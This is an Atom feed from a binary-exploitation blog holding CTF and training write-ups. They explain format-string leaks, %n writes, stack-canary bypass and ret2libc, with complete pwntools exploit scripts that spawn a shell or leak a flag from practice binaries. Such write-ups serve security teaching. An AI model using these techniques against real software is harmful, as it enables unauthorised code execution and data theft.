<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-05-08T14:51:34+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">TourPran Blogs</title><subtitle>This is my blog for Binary Exploitation and Reverse Engineering.</subtitle><author><name>tourpran</name></author><entry><title type="html">tallocator - bi0sCTF24</title><link href="http://localhost:4000/writeup/2024/03/01/bi0sCTF-tallocator.html" rel="alternate" type="text/html" title="tallocator - bi0sCTF24" /><published>2024-03-01T00:00:00+05:30</published><updated>2024-03-01T00:00:00+05:30</updated><id>http://localhost:4000/writeup/2024/03/01/bi0sCTF-tallocator</id><content type="html" xml:base="http://localhost:4000/writeup/2024/03/01/bi0sCTF-tallocator.html"><![CDATA[<p>Exploiting arbitrary free to corrupt heap meta data, in a custom implementation of malloc/ free in Android. Explore SELinux, reverse-shell, heap exploitation.</p>]]></content><author><name>tourpran</name></author><category term="writeup" /><category term="pwn" /><category term="android" /><category term="heap" /><summary type="html"><![CDATA[Exploiting arbitrary free to corrupt heap meta data, in a custom implementation of malloc/ free in Android. Explore SELinux, reverse-shell, heap exploitation.]]></summary></entry><entry><title type="html">[check] Checkpoint</title><link href="http://localhost:4000/pwn-training/2022/01/20/checkpointpwn.html" rel="alternate" type="text/html" title="[check] Checkpoint" /><published>2022-01-20T00:00:00+05:30</published><updated>2022-01-20T00:00:00+05:30</updated><id>http://localhost:4000/pwn-training/2022/01/20/checkpointpwn</id><content type="html" xml:base="http://localhost:4000/pwn-training/2022/01/20/checkpointpwn.html"><![CDATA[<p><img src="/images/checkpointaresx/ss1.png" alt="" /></p>

<h3 id="introduction">Introduction:</h3>
<p>Hey everyone, congrats on reaching this level. This level acts as a checkpoint (name suggests). You will be combining the idea of format strings, buffer overflows, canaries from previous blogposts. Try this level on your own and check for hints when stuck.</p>

<h3 id="challenge">Challenge:</h3>
<p>Download below challenge file.</p>

<p><a href="/images/checkpointaresx/checkpoint_1.zip">FILES</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>
<p><img src="/images/checkpointaresx/ss2.png" alt="" />
No need to explain mitigations right ? These are different protections created to rule out certain types of attacks, make hackers life a little harder.</p>

<h4 id="code-walkthrough">Code Walkthrough:</h4>

<p>We are given the c code. Here in the main program, there is a while loop to run the format string vulnerability and finally a compare statement leading to a fgets call.</p>

<p><img src="/images/checkpointaresx/ss3.png" alt="" /></p>

<h4 id="sample-run">Sample run:</h4>
<p>Runing the file tells us there is a format string exploit.
<img src="/images/checkpointaresx/ss4.png" alt="" /></p>

<h4 id="exploit-idea">Exploit idea:</h4>
<p>Here the challenge is direct and was made to recap what we learnt in the previous blogs. The attack plan is</p>
<ul>
  <li>leaking a binary address, libc address, canary.</li>
  <li>make the strength variable = “STRENGTH”</li>
  <li>increase the size variable to a much larger value for a buffer overflow. (tricky part)</li>
</ul>

<h4 id="format-string-exploit">Format string exploit:</h4>

<p>We already know what format strings are… now leak the stack little by little and see what useful values you get. I got the following values:</p>

<pre><code class="language-leak">16: my input
49: canary
51: a libc address
56: a binary address
</code></pre>

<p>Now you got the values so calculate the address relatively with the binary/libc or initialise the binary and libc as elf with the help of pwntools ELF() function.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Need to know the libc. (used by default libc for local purpose)
</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__libc_csu_init</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">159923</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>
<span class="c1">#My weird way of receiving and splitin.
</span></code></pre></div></div>
<h4 id="formats-again">Formats again:</h4>
<p>The second task was to change the value of the global variables and make it favourable for us.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fmt</span> <span class="o">=</span> <span class="nf">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="p">{</span>
    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">size</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">strength</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">STRENGTH</span><span class="sh">"</span><span class="p">),</span>
<span class="p">})</span>
</code></pre></div></div>
<p>Here I am making the size variable much larger than buffer size, making strength variable equal to “STRENGTH” to pass the check.</p>

<h4 id="buffer-overflow">Buffer Overflow:</h4>

<p>Finally you do a bit of fiddling to get the correct offset of the stack canary and overwrite with the leaked canary, then simply do a ret2libc.</p>

<h4 id="exploit">Exploit:</h4>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./checkpoint</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="sh">"</span><span class="s">/usr/lib/x86_64-linux-gnu/libc.so.6</span><span class="sh">"</span>
<span class="nf">if</span><span class="p">(</span><span class="n">libc</span> <span class="o">!=</span> <span class="sh">""</span><span class="p">):</span>
	<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
b* main
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="sh">'''</span><span class="s">
NOTES:
16: my input
49: canary
51: a libc address
56: a binary address
</span><span class="sh">'''</span>

<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%49$p-%51$p-%56$p</span><span class="sh">"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>

<span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__libc_csu_init</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mi">159923</span>
<span class="n">canary</span> <span class="o">=</span> <span class="nf">int</span><span class="p">((</span><span class="nf">str</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">elf base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">libc base: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="n">fmt</span> <span class="o">=</span> <span class="nf">fmtstr_payload</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="p">{</span>
    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">size</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span>
    <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">strength</span><span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">STRENGTH</span><span class="sh">"</span><span class="p">),</span>
<span class="p">})</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">y</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">fmt</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">$p</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">n</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mh">0x158</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1016</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x151b</span><span class="p">)</span><span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">)))</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</code></pre></div></div>

<p>This was short and crisp since all these topics are already covered in the rest of the blogs. Happy Hacking.</p>]]></content><author><name>tourpran</name></author><category term="pwn-training" /><category term="pwn" /><category term="format string" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Leaky pipes - InCTFj Quals</title><link href="http://localhost:4000/writeup/2021/12/30/inctfjquals.html" rel="alternate" type="text/html" title="Leaky pipes - InCTFj Quals" /><published>2021-12-30T00:00:00+05:30</published><updated>2021-12-30T00:00:00+05:30</updated><id>http://localhost:4000/writeup/2021/12/30/inctfjquals</id><content type="html" xml:base="http://localhost:4000/writeup/2021/12/30/inctfjquals.html"><![CDATA[<h3 id="intro">Intro:</h3>
<p>Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called <code class="language-plaintext highlighter-rouge">leaky pipes</code>. Make sure to give the challenge a try before seeing this.</p>

<h3 id="challenge-file">Challenge file:</h3>
<p><a href="/assets/leakyinctfj/leaky_pipes">vuln binary</a> and 
<a href="/assets/leakyinctfj/leaky.c">vuln c code</a></p>

<h3 id="pre-requisites">Pre requisites:</h3>
<ul>
  <li>Basic understanding of how computers work.</li>
  <li>Know what format strings are.</li>
  <li>will to learn more from googling.</li>
</ul>

<h3 id="mitigations">Mitigations:</h3>

<p><img src="/assets/leakyinctfj/ss1.png" alt="" /></p>

<ul>
  <li>Most of the format string exploitation will have all the mitigations enabled.</li>
  <li>RELRO: GOT related stuff.</li>
  <li>Stack Canary: unique value stoping buffer overflow.</li>
  <li>NX: Makes the stack not excecutable.</li>
  <li>PIE: the binary will have different address during different runs.</li>
</ul>

<h3 id="sample-run">Sample run:</h3>
<p>Lets simply run the binary, while doing this make sure to read the c code and get comfortable with the binary as a whole.</p>

<p><img src="/assets/leakyinctfj/ss2.png" alt="" /></p>

<ul>
  <li>We can give three options (1, 2, 3) but 2 options doesnt do anything.</li>
  <li>option 1: Give an input and get same output back from the printf function.</li>
  <li>option 3: Currently unavailable since we dont have enough cash.</li>
</ul>

<h3 id="exploit-basics">Exploit Basics:</h3>
<p>Format string exploitation occurs when you use the printf function carelessly. Correct Usage of printf will be to use the format strings/ format specifiers in the first part and all the parameters in the 2nd part.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"my name is : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"giovanni giorgio"</span><span class="p">);</span>
</code></pre></div></div>
<p>Problem occurs when attackers are given access to these format strings part. So as an attacker he can specify formats which will try to retrieve values that are not specified, hence will take values from the stack. Incorrect usage.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span> <span class="c1">//buffer = user input</span>
</code></pre></div></div>

<h3 id="exploit-idea">Exploit Idea:</h3>
<p>We have to somehow go to the use_tape() Since it has our flag and another format string exploit.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">use_tape</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">experience</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
	<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>

	<span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
	<span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
		<span class="n">fgets</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
		<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>

		<span class="n">printf</span><span class="p">(</span><span class="s">"Please give us your feedback!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">fgets</span><span class="p">(</span><span class="n">experience</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="n">experience</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span><span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"Error opening file!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>But the small caviat is we can’t go there directly we somehow have to increase our balance from 100 to 200 (exactly) and then call <code class="language-plaintext highlighter-rouge">buy_repair_kit()</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">buy_repair_kit</span><span class="p">(){</span>
    <span class="k">if</span><span class="p">(</span><span class="n">bal</span> <span class="o">==</span> <span class="mi">200</span><span class="p">){</span>
        <span class="n">use_tape</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">else</span><span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"You do not have enough balance! :(</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="format-string-1">Format string 1:</h3>

<p>First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack).</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-%p</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>Sending many %p with the ‘-‘ acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binary’s address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)</p>

<p><img src="/assets/leakyinctfj/ss4.jpg" alt="" /></p>

<p><img src="/assets/leakyinctfj/ss3.png" alt="" /></p>

<blockquote>
  <p>fact to know: When PIE is enabled the entire binary changes its place but the relative address of functions and variables remain same.</p>
</blockquote>

<p>Pick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">baladd</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">bal address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="format-string-2">Format string 2:</h3>

<p>Well! part 1/3 is over and it was just the easy part. Now comes the tricky part, I wasted hours trying to find a way to make the bal variable = 200. Finally I came upon a solution after hours of googling.
I call the leak function and give the string to overwrite the bal variable.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p.sendline(b"%99c%9$n%90c%9$n%11c%9$n" + p64(baladd))
</code></pre></div></div>
<p>Let me explain in parts what it does.</p>

<p>While doing a format string exploit to overwrite a variable or a function address… Check where your input is appearing and keep note of the index.</p>

<p><img src="/assets/leakyinctfj/ss5.jpg" alt="" /></p>

<p>Here my string of <code class="language-plaintext highlighter-rouge">AAAAAAAA</code> repeats in the index 6. Now its just a matter of overwriting the variable. But… wait. How to overwrite ? we sure dont have no buffer overflow, can printf be used to overwrite ? da flick ?</p>

<p><img src="/assets/leakyinctfj/ss5.png" alt="" /></p>

<p>Yes! The format specifier %n will write the number of bytes read till now into the address specified. So things become simple, Just put 200 bytes put the address of the variable, so the value of 100 will change to 200. Is it that simple ? kinda yes. One more caviat is only 8 bytes are read and excecuted by the program at a time, So we slowly build up the no of bytes and the put the value into specifc address.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value.
</code></pre></div></div>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%99c%9$n%90c%9$n%11c%9$n</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span> <span class="c1">#(c = character, $n = to write)
</span></code></pre></div></div>

<p>Above I have added (99+90+11) which gives 200 into 9th offset since the <code class="language-plaintext highlighter-rouge">p64(baladd)</code> will place the address of baladd in the 9th index from start.</p>

<h3 id="format-string-3">Format string 3:</h3>
<p>Great job guys! Final part is damn simple just call the <code class="language-plaintext highlighter-rouge">buy_repair_kit()</code> function which now satify bal == 200 and call use_tape(), Here the flag is opened and just read into the stack followed by an unsafe printf leading to format string exploitation. Just leak most of the stack and get the flag. GG</p>

<h3 id="full-exploit-script">Full Exploit Script:</h3>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">x86</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chall</span><span class="sh">'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./chall</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
<span class="c1"># p = remote("gc1.eng.run", 32309)
</span>
<span class="c1">#Leaking the bal variable address
</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">like to check your leaks?</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-%p</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>

<span class="n">baladd</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">bal address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="c1">#Over write bal with 200 to bypass the check
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%99c%9$n%90c%9$n%11c%9$n</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>

<span class="c1">#Leak the flag from the stack since its opened
</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">feedback!</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p</span><span class="sh">"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>

<span class="c1">#Change the hex flag to ascii
</span><span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
<span class="n">final</span> <span class="o">=</span> <span class="sh">""</span>

<span class="k">for</span> <span class="n">hexval</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
